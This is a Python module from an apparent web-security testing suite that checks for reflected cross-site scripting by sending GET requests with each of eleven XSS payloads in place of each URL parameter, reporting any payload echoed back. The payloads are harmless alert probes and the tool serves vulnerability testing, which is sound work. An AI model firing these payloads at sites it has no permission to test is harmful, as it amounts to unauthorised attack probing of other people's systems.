"""Basic reflected XSS detection via GET parameter fuzzing."""
from __future__ import annotations

import threading
import urllib.parse
from typing import Callable

import requests
from requests.exceptions import RequestException

from .models import Finding

_PAYLOADS = [
    "<script>alert(1)</script>",
    "<script>alert('XSS')</script>",
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "';alert(1)//",
    '";alert(1)//',
    "<iframe src=javascript:alert(1)>",
]


def _get_params(url: str) -> dict[str, str]:
    parsed = urllib.parse.urlparse(url)
    return dict(urllib.parse.parse_qsl(parsed.query))


def _inject_url(url: str, params: dict[str, str]) -> str:
    parsed = urllib.parse.urlparse(url)
    qs = urllib.parse.urlencode(params)
    return urllib.parse.urlunparse(parsed._replace(query=qs))


def fuzz(
    url: str,
    timeout: float,
    stop_event: threading.Event,
    on_finding: Callable[[Finding], None],
    on_progress: Callable[[str], None],
) -> list[Finding]:
    base_params = _get_params(url)
    if not base_params:
        on_progress("[!] No GET parameters in URL — nothing to fuzz.\n")
        on_progress("[*] Tip: Use a URL like http://target/page?name=test\n")
        return []

    session = requests.Session()
    session.headers["User-Agent"] = "CyberSuite/WAT XSSFuzzer"
    findings: list[Finding] = []
    hit_params: set[str] = set()

    for param in base_params:
        for payload in _PAYLOADS:
            if stop_event.is_set():
                return findings
            if param in hit_params:
                break
            test_params = {**base_params, param: payload}
            test_url = _inject_url(url, test_params)
            on_progress(f"[*] {param} → {payload[:40]}\n")
            try:
                r = session.get(test_url, timeout=timeout)
                if payload in r.text or urllib.parse.quote(payload) in r.text:
                    f = Finding(
                        type="xss_hit",
                        severity="HIGH",
                        url=test_url,
                        detail=f"Payload reflected in response for param '{param}'",
                        evidence={"param": param, "payload": payload},
                    )
                    findings.append(f)
                    on_finding(f)
                    hit_params.add(param)
            except RequestException:
                pass

    return findings
